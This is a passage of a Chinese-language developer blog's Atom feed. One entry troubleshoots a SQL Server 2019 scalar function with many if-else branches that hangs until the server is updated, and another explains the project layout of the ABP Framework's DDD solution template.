<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>亂馬客 - Re:從零開始的軟體開發生活</title>
  <icon>https://www.gravatar.com/avatar/cd3aed042ccd7a5a5d9956b0bc07dc81</icon>
  <subtitle>Re:從零開始的軟體開發生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rainmakerho.github.io/"/>
  <updated>2022-11-24T09:58:15.405Z</updated>
  <id>https://rainmakerho.github.io/</id>
  
  <author>
    <name>亂馬客</name>
    <email>rainmaker_ho@gss.com.tw</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>在 Microsoft SQL Server 2019 如果有太多的 if-else 在 Scalar Function 中，執行該 Function 會跑很久?</title>
    <link href="https://rainmakerho.github.io/2022/11/24/sql-2019-too-many-if-else-cause-hang/"/>
    <id>https://rainmakerho.github.io/2022/11/24/sql-2019-too-many-if-else-cause-hang/</id>
    <published>2022-11-24T02:50:52.000Z</published>
    <updated>2022-11-24T09:58:15.405Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近同事詢問一個很奇怪的問題，他們有一個 Scalar Function 在 MSSQL 2019 (15.0.2000.5)上面執行，<br>透過 SSMS 直接執行該 Function ，結果一直跑不出來。<br>直接跑 Function 裡面的 Script，卻一下子就跑出來。<br>一樣的程式，在另一台 Server (15.0.4153.1)上也一下子就跑出來了。<br>到底是怎麼一回事呢?</p><h3 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h3><p>SQL 的 Scalar Function 大約長的如下的程式碼(if else if ….大約 <strong>19 個</strong>)，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> [dbo].[ufn_get_user_info3](</span><br><span class="line"> @strUserName <span class="keyword">NVARCHAR</span>(<span class="number">256</span>),</span><br><span class="line"> @strKIND <span class="keyword">NVARCHAR</span>(<span class="number">50</span>) = <span class="string">'USER_NAME'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="keyword">NVARCHAR</span>(<span class="number">4000</span>)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">Begin</span></span><br><span class="line"> <span class="keyword">DECLARE</span> @strRTN_VAL <span class="keyword">NVARCHAR</span>(<span class="number">4000</span>) = <span class="string">''</span>;    <span class="comment">--回傳值</span></span><br><span class="line"> if @strKIND = 'UserName'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = UserName</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'NormalizedUserName'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = NormalizedUserName</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'Name'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [<span class="keyword">Name</span>]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'Surname'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [Surname]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'Email'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [Email]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'NormalizedEmail'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [NormalizedEmail]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'PasswordHash'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [PasswordHash]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'PhoneNumber'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [PhoneNumber]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'SecurityStamp'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = [SecurityStamp]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'ExtraProperties'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL =[ExtraProperties]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'ConcurrencyStamp'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL =[ConcurrencyStamp]</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'CreationTime'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">convert</span>(<span class="keyword">nvarchar</span>(<span class="number">4000</span>),[CreationTime], <span class="number">120</span>)</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'LastModificationTime'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">convert</span>(<span class="keyword">nvarchar</span>(<span class="number">4000</span>),[LastModificationTime] , <span class="number">120</span>)</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'DeletionTime'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">convert</span>(<span class="keyword">nvarchar</span>(<span class="number">4000</span>),[DeletionTime] , <span class="number">120</span>)</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'Id'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">cast</span>(<span class="keyword">Id</span> <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">200</span>))</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'TenantId'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">cast</span>([TenantId] <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">200</span>))</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'CreatorId'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">cast</span>([CreatorId] <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">200</span>))</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'LastModifierId'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">cast</span>([LastModifierId] <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">200</span>))</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> else if @strKIND = 'DeleterId'</span><br><span class="line"> <span class="keyword">begin</span></span><br><span class="line"><span class="keyword">SELECT</span> @strRTN_VAL = <span class="keyword">cast</span>([DeleterId] <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">200</span>))</span><br><span class="line">          <span class="keyword">FROM</span> [AbpUsers] <span class="keyword">WITH</span>(NOLOCK)</span><br><span class="line">  <span class="keyword">WHERE</span> UserName = @strUserName;</span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"> return @strRTN_VAL;</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>直接在 SSMS 下 <code>Select [dbo].[ufn_get_user_info3](&#39;admin&#39;, &#39;NormalizedEmail&#39;)</code> 就沒有回應了。</p><p>原本想說會不會是使用了太多 CPU 的原因，<br>所以在原本的 Script 後加上 <code>OPTION (MAXDOP 1)</code> ，<br>還是一樣的狀況。在測試環境上，約跑了 <strong>1 分 24 秒</strong> 資料才出來。<br><img src="/2022/11/24/sql-2019-too-many-if-else-cause-hang/01.png" title="跑1分24秒"></p><p>預估的執行計劃如下，<br><img src="/2022/11/24/sql-2019-too-many-if-else-cause-hang/02.png" title="執行計劃"></p><p>但刪掉一些 if-else 資料就可以很順利的跑出來。<br>完全沒想法，感覺 SQL 都到了 2019 應該不會有這種 問題呀~~~<br>…<br>…<br>…<br>結果後來同事將 MSSQL 2019 更新到新的版本，執行就沒問題了。<br>目前測試在 SQL Server 2019 版本 15.0.4153.1 上跑是沒問題的。</p><p>下次要懷疑自已前，先懷疑軟體是否有更新到新的版本。</p><p>測試的資料如下，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers](</span><br><span class="line">[<span class="keyword">Id</span>] [uniqueidentifier] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[TenantId] [uniqueidentifier] <span class="literal">NULL</span>,</span><br><span class="line">[UserName] [<span class="keyword">nvarchar</span>](<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[NormalizedUserName] [<span class="keyword">nvarchar</span>](<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[<span class="keyword">Name</span>] [<span class="keyword">nvarchar</span>](<span class="number">64</span>) <span class="literal">NULL</span>,</span><br><span class="line">[Surname] [<span class="keyword">nvarchar</span>](<span class="number">64</span>) <span class="literal">NULL</span>,</span><br><span class="line">[Email] [<span class="keyword">nvarchar</span>](<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[NormalizedEmail] [<span class="keyword">nvarchar</span>](<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[EmailConfirmed] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[PasswordHash] [<span class="keyword">nvarchar</span>](<span class="number">256</span>) <span class="literal">NULL</span>,</span><br><span class="line">[SecurityStamp] [<span class="keyword">nvarchar</span>](<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[IsExternal] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[PhoneNumber] [<span class="keyword">nvarchar</span>](<span class="number">16</span>) <span class="literal">NULL</span>,</span><br><span class="line">[PhoneNumberConfirmed] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[IsActive] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[TwoFactorEnabled] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[LockoutEnd] [datetimeoffset](<span class="number">7</span>) <span class="literal">NULL</span>,</span><br><span class="line">[LockoutEnabled] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[AccessFailedCount] [<span class="built_in">int</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[ExtraProperties] [<span class="keyword">nvarchar</span>](<span class="keyword">max</span>) <span class="literal">NULL</span>,</span><br><span class="line">[ConcurrencyStamp] [<span class="keyword">nvarchar</span>](<span class="number">40</span>) <span class="literal">NULL</span>,</span><br><span class="line">[CreationTime] [datetime2](<span class="number">7</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[CreatorId] [uniqueidentifier] <span class="literal">NULL</span>,</span><br><span class="line">[LastModificationTime] [datetime2](<span class="number">7</span>) <span class="literal">NULL</span>,</span><br><span class="line">[LastModifierId] [uniqueidentifier] <span class="literal">NULL</span>,</span><br><span class="line">[IsDeleted] [<span class="built_in">bit</span>] <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">[DeleterId] [uniqueidentifier] <span class="literal">NULL</span>,</span><br><span class="line">[DeletionTime] [datetime2](<span class="number">7</span>) <span class="literal">NULL</span>,</span><br><span class="line"> <span class="keyword">CONSTRAINT</span> [PK_AbpUsers] PRIMARY <span class="keyword">KEY</span> CLUSTERED</span><br><span class="line">(</span><br><span class="line">[<span class="keyword">Id</span>] <span class="keyword">ASC</span></span><br><span class="line">)<span class="keyword">WITH</span> (PAD_INDEX = <span class="keyword">OFF</span>, STATISTICS_NORECOMPUTE = <span class="keyword">OFF</span>, IGNORE_DUP_KEY = <span class="keyword">OFF</span>, ALLOW_ROW_LOCKS = <span class="keyword">ON</span>, ALLOW_PAGE_LOCKS = <span class="keyword">ON</span>, OPTIMIZE_FOR_SEQUENTIAL_KEY = <span class="keyword">OFF</span>) <span class="keyword">ON</span> [PRIMARY]</span><br><span class="line">) <span class="keyword">ON</span> [PRIMARY] TEXTIMAGE_ON [PRIMARY]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">INSERT</span> [dbo].[AbpUsers] ([<span class="keyword">Id</span>], [TenantId], [UserName], [NormalizedUserName], [<span class="keyword">Name</span>], [Surname], [Email], [NormalizedEmail], [EmailConfirmed], [PasswordHash], [SecurityStamp], [IsExternal], [PhoneNumber], [PhoneNumberConfirmed], [IsActive], [TwoFactorEnabled], [LockoutEnd], [LockoutEnabled], [AccessFailedCount], [ExtraProperties], [ConcurrencyStamp], [CreationTime], [CreatorId], [LastModificationTime], [LastModifierId], [IsDeleted], [DeleterId], [DeletionTime]) <span class="keyword">VALUES</span> (N<span class="string">'eaeeb5db-5209-0e71-b58c-3a0380591d83'</span>, <span class="literal">NULL</span>, N<span class="string">'admin'</span>, N<span class="string">'ADMIN'</span>, N<span class="string">'admin'</span>, N<span class="string">''</span>, N<span class="string">'rainmaker_ho@gss.com.tw'</span>, N<span class="string">'RAINMAKER_HO@GSS.COM.TW'</span>, <span class="number">0</span>, N<span class="string">'AQAAAAEAACcQAAAAEBtitT9fC5a4FAueYPe3RUKq9/lq9mLTQuax0+7vgydsV05Xtf4lzjq+4C9LAfChPA=='</span>, N<span class="string">'GXPCPZASRPVU7LUMWXR4OESDEFZDUCS4'</span>, <span class="number">0</span>, N<span class="string">''</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, N<span class="string">'&#123;&#125;'</span>, N<span class="string">'c353047ea876484bba0901b79ccf4533'</span>, <span class="keyword">CAST</span>(N<span class="string">'2022-04-28T11:17:16.9722713'</span> <span class="keyword">AS</span> DateTime2), <span class="literal">NULL</span>, <span class="keyword">CAST</span>(N<span class="string">'2022-04-28T16:29:42.7502832'</span> <span class="keyword">AS</span> DateTime2), N<span class="string">'eaeeb5db-5209-0e71-b58c-3a0380591d83'</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> (<span class="keyword">CONVERT</span>([<span class="built_in">bit</span>],(<span class="number">0</span>))) <span class="keyword">FOR</span> [EmailConfirmed]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> (<span class="keyword">CONVERT</span>([<span class="built_in">bit</span>],(<span class="number">0</span>))) <span class="keyword">FOR</span> [IsExternal]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> (<span class="keyword">CONVERT</span>([<span class="built_in">bit</span>],(<span class="number">0</span>))) <span class="keyword">FOR</span> [PhoneNumberConfirmed]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> (<span class="keyword">CONVERT</span>([<span class="built_in">bit</span>],(<span class="number">0</span>))) <span class="keyword">FOR</span> [TwoFactorEnabled]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> (<span class="keyword">CONVERT</span>([<span class="built_in">bit</span>],(<span class="number">0</span>))) <span class="keyword">FOR</span> [LockoutEnabled]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> ((<span class="number">0</span>)) <span class="keyword">FOR</span> [AccessFailedCount]</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [dbo].[AbpUsers] <span class="keyword">ADD</span>  <span class="keyword">DEFAULT</span> (<span class="keyword">CONVERT</span>([<span class="built_in">bit</span>],(<span class="number">0</span>))) <span class="keyword">FOR</span> [IsDeleted]</span><br><span class="line"><span class="keyword">GO</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近同事詢問一個很奇怪的問題，他們有一個 Scalar Function 在 MSSQL 2019 (15.0.2000.5)上面執行，&lt;b
      
    
    </summary>
    
    
      <category term="hang" scheme="https://rainmakerho.github.io/tags/hang/"/>
    
      <category term="windows" scheme="https://rainmakerho.github.io/tags/windows/"/>
    
      <category term="mssql" scheme="https://rainmakerho.github.io/tags/mssql/"/>
    
      <category term="sql 2019" scheme="https://rainmakerho.github.io/tags/sql-2019/"/>
    
      <category term="15.0 RTM" scheme="https://rainmakerho.github.io/tags/15-0-RTM/"/>
    
      <category term="15.0.2000.5" scheme="https://rainmakerho.github.io/tags/15-0-2000-5/"/>
    
      <category term="Timeout" scheme="https://rainmakerho.github.io/tags/Timeout/"/>
    
  </entry>
  
  <entry>
    <title>探索 ABP Framework Web 方案</title>
    <link href="https://rainmakerho.github.io/2022/11/17/abp-structuring-solution-ddd/"/>
    <id>https://rainmakerho.github.io/2022/11/17/abp-structuring-solution-ddd/</id>
    <published>2022-11-17T03:09:30.000Z</published>
    <updated>2022-11-18T03:04:24.536Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>ABP Framework 的 Template 方案，是依 Domain-Driven Design (DDD) 原則去實現分層應用，<br>但是為什麼它所建立出來的方案中會多出許多的專案呢?<br>以下就讓我們來了解一番 ^_^</p><h3 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h3><p>Domain-Driven Design (DDD) 常見到的就是以下的圖，<br><img src="/2022/11/17/abp-structuring-solution-ddd/01.png" title="DDD"></p><ul><li>上圖來自 <a href="https://dzone.com/articles/onion-architecture-is-interesting" target="_blank" rel="noopener">Onion Architecture Is Interesting</a></li></ul><h5 id="基本的-DDD-Web-系統"><a href="#基本的-DDD-Web-系統" class="headerlink" title="基本的 DDD Web 系統"></a>基本的 DDD Web 系統</h5><p>所以 DDD 的 Web 系統基本上會建立 4 個專案(以 ProductManagement 為例)，</p><p>1.Domain<br>包含 business object 及 Repository interface ，例如 Product class (aggregate root entity), IProductRepository interface</p><p>2.Application<br>參考 Domain 專案，建立 Service class 利用 Repository interface 來操作 business object，例如 ProductAppService class 中透過 IProductRepository interface 針對 Product class 進行 CRUD</p><p>3.Infrastructure<br>參考 Domain 專案，實作 Repository interface，進行實際的資料操作</p><p>4.Web<br>參考 Application 專案，建立 UI 提供使用者使用，透過 Application 的 Service 來進行各項操作。<br>執行時 Application 需要 Infrastructure 去存取資料庫。</p><p>所以各專案的關連就如下圖，<br><img src="/2022/11/17/abp-structuring-solution-ddd/02.png" title="DDD Projects Relation"></p><h5 id="ABP-Framework-的-Template-方案"><a href="#ABP-Framework-的-Template-方案" class="headerlink" title="ABP Framework 的 Template 方案"></a>ABP Framework 的 Template 方案</h5><p>當我們透過 ABP CLI 來建立方案時，會有以下幾個專案，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ProductManagement</span><br><span class="line"><span class="built_in">cd</span> ProductManagement</span><br><span class="line">ABP new ProductManagement</span><br></pre></td></tr></table></figure><img src="/2022/11/17/abp-structuring-solution-ddd/03.png" title="ABP Projects"><p>ABP 存取資料庫是使用 EntityFrameworkCore 所以它會對應到 Infrastructure 專案。<br>但如果只有這 4 個專案會有一個問題，<br>就是 Web 專案會間接參考到 Domain 專案 (透過 Application 專案)，<br>就沒達到分層的意義。</p><p>所以 ABP template 就將 application layer 分成 2 個專案，<br>1.Application.Contracts<br>定義 application service interface 及相關的 DTOs ，例如 IProductAppService interface 及 ProductCreationDto class</p><p>2.Application<br>實作 Application.Contracts 專案定義的 service interface，例如 ProductAppService 實作 IProductAppService</p><p>所以，Web 專案原本是參考 Application 專案 及間接參考到 Domain 專案，<br>會改成參考 Application.Contracts 專案，也不會再間接參考到 Domain 專案，<br>透過 Application.Contracts 中的 service interface 來進行各項的操作，<br>而原本需要使用到的 business object 則改使用 DTOs。<br>當然，在執行時，還是會使用實作 interface 的 Application 專案及 EntityFrameworkCore 專案。</p><p>但在實際上，可能想要重用 Domain 專案中的一些類別或是數值的定義，<br>例如 ProductType enum 或是 產品名稱最大長度。<br>這些都是一樣的，不想重覆在 Domain 專案及 ApplicationContracts 專案之中。</p><p>所以 ABP template 就再多一個 Domain.Shared 專案，來放這些共用的 type 及 常數。<br>到這裡，ABP template 各專案的關連就如下圖，<br><img src="/2022/11/17/abp-structuring-solution-ddd/04.png" title="ABP Projects 